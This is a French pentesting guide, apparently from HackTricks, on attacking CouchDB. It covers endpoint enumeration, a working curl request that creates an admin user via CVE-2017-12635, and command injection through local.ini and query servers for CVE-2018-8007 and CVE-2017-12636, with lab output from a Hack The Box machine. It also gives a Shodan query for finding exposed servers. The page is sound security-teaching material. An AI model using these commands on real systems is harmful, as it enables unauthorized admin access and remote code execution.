# 5984,6984 - Pentesting CouchDB

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Informations de base**

**CouchDB** est une base de donn√©es **orient√©e document** polyvalente et puissante qui organise les donn√©es en utilisant une structure de **carte cl√©-valeur** au sein de chaque **document**. Les champs √† l'int√©rieur du document peuvent √™tre repr√©sent√©s sous forme de **paires cl√©/valeur, de listes ou de cartes**, offrant une flexibilit√© dans le stockage et la r√©cup√©ration des donn√©es.

Chaque **document** stock√© dans CouchDB se voit attribuer un **identifiant unique** (`_id`) au niveau du document. De plus, chaque modification apport√©e et enregistr√©e dans la base de donn√©es se voit attribuer un **num√©ro de r√©vision** (`_rev`). Ce num√©ro de r√©vision permet un **suivi et une gestion efficaces des changements**, facilitant la r√©cup√©ration et la synchronisation des donn√©es au sein de la base de donn√©es.

**Port par d√©faut :** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **√ânum√©ration Automatique**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## √ânum√©ration Manuelle

### Banni√®re
```
curl http://IP:5984/
```
Cela envoie une requ√™te GET √† l'instance CouchDB install√©e. La r√©ponse devrait ressembler √† l'une des suivantes :
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
Notez que si vous acc√©dez √† la racine de couchdb et que vous recevez un `401 Unauthorized` avec quelque chose comme ceci : `{"error":"unauthorized","reason":"Authentication required."}` **vous ne pourrez pas acc√©der** √† la banni√®re ou √† tout autre point de terminaison.
{% endhint %}

### Info Enumeration

Ce sont les points de terminaison auxquels vous pouvez acc√©der avec une **GET** request et extraire des informations int√©ressantes. Vous pouvez trouver [**plus de points de terminaison et des descriptions plus d√©taill√©es dans la documentation de couchdb**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** Liste des t√¢ches en cours, y compris le type de t√¢che, le nom, le statut et l'ID de processus.
* **`/_all_dbs`** Renvoie une liste de toutes les bases de donn√©es dans l'instance CouchDB.
* **`/_cluster_setup`** Renvoie le statut du n≈ìud ou du cluster, selon l'assistant de configuration du cluster.
* **`/_db_updates`** Renvoie une liste de tous les √©v√©nements de base de donn√©es dans l'instance CouchDB. L'existence de la base de donn√©es `_global_changes` est requise pour utiliser ce point de terminaison.
* **`/_membership`** Affiche les n≈ìuds qui font partie du cluster en tant que `cluster_nodes`. Le champ `all_nodes` affiche tous les n≈ìuds que ce n≈ìud conna√Æt, y compris ceux qui font partie du cluster.
* **`/_scheduler/jobs`** Liste des travaux de r√©plication. Chaque description de travail inclura des informations sur la source et la cible, l'ID de r√©plication, un historique des √©v√©nements r√©cents et quelques autres √©l√©ments.
* **`/_scheduler/docs`** Liste des √©tats des documents de r√©plication. Inclut des informations sur tous les documents, m√™me dans les √©tats `completed` et `failed`. Pour chaque document, il renvoie l'ID du document, la base de donn√©es, l'ID de r√©plication, la source et la cible, et d'autres informations.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** Le point de terminaison `/_node/{node-name}` peut √™tre utilis√© pour confirmer le nom du n≈ìud Erlang du serveur qui traite la demande. Cela est particuli√®rement utile lors de l'acc√®s √† `/_node/_local` pour r√©cup√©rer cette information.
* **`/_node/{node-name}/_stats`** La ressource `_stats` renvoie un objet JSON contenant les statistiques pour le serveur en cours d'ex√©cution. La cha√Æne litt√©rale `_local` sert d'alias pour le nom du n≈ìud local, donc pour toutes les URL de statistiques, `{node-name}` peut √™tre remplac√© par `_local`, pour interagir avec les statistiques du n≈ìud local.
* **`/_node/{node-name}/_system`** La ressource \_system renvoie un objet JSON contenant diverses statistiques au niveau syst√®me pour le serveur en cours d'ex√©cution\_.\_ Vous pouvez utiliser \_\_`_local` comme {node-name} pour obtenir des informations sur le n≈ìud actuel.
* **`/_node/{node-name}/_restart`**
* **`/_up`** Confirme que le serveur est en marche, fonctionne et pr√™t √† r√©pondre aux demandes. Si [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) est `true` ou `nolb`, le point de terminaison renverra une r√©ponse 404.
* **`/_uuids`** Demande un ou plusieurs Identifiants Universellement Uniques (UUID) de l'instance CouchDB.
* **`/_reshard`** Renvoie un compte des travaux termin√©s, √©chou√©s, en cours, arr√™t√©s et totaux ainsi que l'√©tat de la r√©partition sur le cluster.

Des informations plus int√©ressantes peuvent √™tre extraites comme expliqu√© ici : [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **Database List**
```
curl -X GET http://IP:5984/_all_dbs
```
Si cette requ√™te **r√©pond avec un 401 non autoris√©**, alors vous avez besoin de **identifiants valides** pour acc√©der √† la base de donn√©es :
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
Pour trouver des identifiants valides, vous pourriez **essayer de** [**bruteforcer le service**](../generic-methodologies-and-resources/brute-force.md#couchdb).

Ceci est un **exemple** d'une **r√©ponse** de couchdb lorsque vous avez **suffisamment de privil√®ges** pour lister les bases de donn√©es (C'est juste une liste de bases de donn√©es) :
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### Database Info

Vous pouvez obtenir des informations sur la base de donn√©es (comme le nombre de fichiers et les tailles) en acc√©dant au nom de la base de donn√©es :
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **Liste des documents**

Liste chaque entr√©e dans une base de donn√©es
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **Lire le Document**

Lire le contenu d'un document √† l'int√©rieur d'une base de donn√©es :
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDB √âl√©vation de Privil√®ges [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Gr√¢ce aux diff√©rences entre les analyseurs JSON d'Erlang et de JavaScript, vous pourriez **cr√©er un utilisateur admin** avec les identifiants `hacktricks:hacktricks` avec la requ√™te suivante :
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**Plus d'informations sur cette vuln√©rabilit√© ici**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### **Aper√ßu de la s√©curit√© des cookies Erlang**

Exemple [d'ici](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Dans la documentation de CouchDB, en particulier dans la section concernant la configuration du cluster ([lien](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), l'utilisation des ports par CouchDB en mode cluster est discut√©e. Il est mentionn√© que, comme en mode autonome, le port `5984` est utilis√©. De plus, le port `5986` est destin√© aux API locales au n≈ìud, et il est important de noter qu'Erlang n√©cessite le port TCP `4369` pour le Daemon de mappage de port Erlang (EPMD), facilitant la communication entre les n≈ìuds au sein d'un cluster Erlang. Cette configuration forme un r√©seau o√π chaque n≈ìud est interconnect√© avec tous les autres n≈ìuds.

Un avis de s√©curit√© crucial est soulign√© concernant le port `4369`. Si ce port est rendu accessible sur Internet ou sur tout r√©seau non fiable, la s√©curit√© du syst√®me repose fortement sur un identifiant unique connu sous le nom de "cookie." Ce cookie agit comme une protection. Par exemple, dans une liste de processus donn√©e, le cookie nomm√© "monster" pourrait √™tre observ√©, indiquant son r√¥le op√©rationnel dans le cadre de s√©curit√© du syst√®me.
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
Pour ceux qui s'int√©ressent √† comprendre comment ce "cookie" peut √™tre exploit√© pour l'ex√©cution de code √† distance (RCE) dans le contexte des syst√®mes Erlang, une section d√©di√©e est disponible pour une lecture approfondie. Elle d√©taille les m√©thodologies pour tirer parti des cookies Erlang de mani√®re non autoris√©e afin d'obtenir le contr√¥le sur les syst√®mes. Vous pouvez **[explorer le guide d√©taill√© sur l'abus des cookies Erlang pour RCE ici](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.

### **Exploitation de CVE-2018-8007 par la modification de local.ini**

Exemple [d'ici](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Une vuln√©rabilit√© r√©cemment divulgu√©e, CVE-2018-8007, affectant Apache CouchDB a √©t√© explor√©e, r√©v√©lant que l'exploitation n√©cessite des permissions d'√©criture sur le fichier `local.ini`. Bien que cela ne soit pas directement applicable au syst√®me cible initial en raison de restrictions de s√©curit√©, des modifications ont √©t√© apport√©es pour accorder l'acc√®s en √©criture au fichier `local.ini` √† des fins d'exploration. Des √©tapes d√©taill√©es et des exemples de code sont fournis ci-dessous, d√©montrant le processus.

Tout d'abord, l'environnement est pr√©par√© en s'assurant que le fichier `local.ini` est modifiable, v√©rifi√© en listant les permissions :
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
Pour exploiter la vuln√©rabilit√©, une commande curl est ex√©cut√©e, ciblant la configuration `cors/origins` dans `local.ini`. Cela injecte une nouvelle origine ainsi que des commandes suppl√©mentaires sous la section `[os_daemons]`, visant √† ex√©cuter du code arbitraire :
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
La v√©rification ult√©rieure montre la configuration inject√©e dans `local.ini`, la contrastant avec une sauvegarde pour mettre en √©vidence les changements :
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
Initialement, le fichier attendu (`/tmp/0xdf`) n'existe pas, ce qui indique que la commande inject√©e n'a pas encore √©t√© ex√©cut√©e. Une enqu√™te plus approfondie r√©v√®le que des processus li√©s √† CouchDB sont en cours d'ex√©cution, y compris un qui pourrait potentiellement ex√©cuter la commande inject√©e :
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
En terminant le processus CouchDB identifi√© et en permettant au syst√®me de le red√©marrer automatiquement, l'ex√©cution de la commande inject√©e est d√©clench√©e, confirm√©e par l'existence du fichier pr√©c√©demment manquant :
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
Cette exploration confirme la viabilit√© de l'exploitation de CVE-2018-8007 dans des conditions sp√©cifiques, notamment la n√©cessit√© d'un acc√®s en √©criture au fichier `local.ini`. Les exemples de code fournis et les √©tapes proc√©durales offrent un guide clair pour reproduire l'exploit dans un environnement contr√¥l√©.

Pour plus de d√©tails sur CVE-2018-8007, consultez l'avis de mdsec : [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **Exploration de CVE-2017-12636 avec des autorisations d'√©criture sur local.ini**

Exemple [d'ici](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Une vuln√©rabilit√© connue sous le nom de CVE-2017-12636 a √©t√© explor√©e, permettant l'ex√©cution de code via le processus CouchDB, bien que des configurations sp√©cifiques puissent emp√™cher son exploitation. Malgr√© de nombreuses r√©f√©rences de Proof of Concept (POC) disponibles en ligne, des ajustements sont n√©cessaires pour exploiter la vuln√©rabilit√© sur la version 2 de CouchDB, diff√©rente de la version 1.x couramment cibl√©e. Les √©tapes initiales consistent √† v√©rifier la version de CouchDB et √† confirmer l'absence du chemin des serveurs de requ√™te attendu :
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
Pour s'adapter √† la version 2.0 de CouchDB, un nouveau chemin est utilis√© :
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
Les tentatives d'ajouter et d'invoquer un nouveau serveur de requ√™tes ont √©t√© confront√©es √† des erreurs li√©es aux autorisations, comme l'indique la sortie suivante :
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Une enqu√™te plus approfondie a r√©v√©l√© des probl√®mes de permission avec le fichier `local.ini`, qui n'√©tait pas modifiable. En modifiant les permissions du fichier avec un acc√®s root ou homer, il est devenu possible de continuer :
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
Les tentatives ult√©rieures d'ajouter le serveur de requ√™tes ont r√©ussi, comme le d√©montre l'absence de messages d'erreur dans la r√©ponse. La modification r√©ussie du fichier `local.ini` a √©t√© confirm√©e par la comparaison des fichiers :
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Le processus s'est poursuivi par la cr√©ation d'une base de donn√©es et d'un document, suivi d'une tentative d'ex√©cuter du code via un mappage de vue personnalis√© vers le serveur de requ√™tes nouvellement ajout√© :
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
A **[r√©sum√©](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)** avec un payload alternatif fournit des informations suppl√©mentaires sur l'exploitation de CVE-2017-12636 dans des conditions sp√©cifiques. **Ressources utiles** pour exploiter cette vuln√©rabilit√© incluent :

- [Code d'exploitation POC](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [Entr√©e de la base de donn√©es d'exploits](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## R√©f√©rences

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
